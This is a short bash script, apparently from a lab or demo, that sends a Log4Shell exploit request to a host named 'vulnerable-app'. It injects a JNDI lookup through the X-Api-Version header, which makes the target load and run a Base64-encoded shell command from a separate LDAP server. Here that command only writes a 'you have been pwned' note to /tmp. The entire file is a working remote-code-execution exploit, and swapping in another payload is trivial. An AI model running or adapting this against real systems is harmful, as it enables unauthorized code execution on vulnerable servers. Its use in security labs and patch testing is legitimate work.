#!/bin/bash

curl http://vulnerable-app:8080 -H 'X-Api-Version: ${jndi:ldap://jndi:1389/Basic/Command/Base64/ZWNobyAieW91IGhhdmUgYmVlbiBwd25lZCIgPiAvdG1wL25vdGUudHh0}'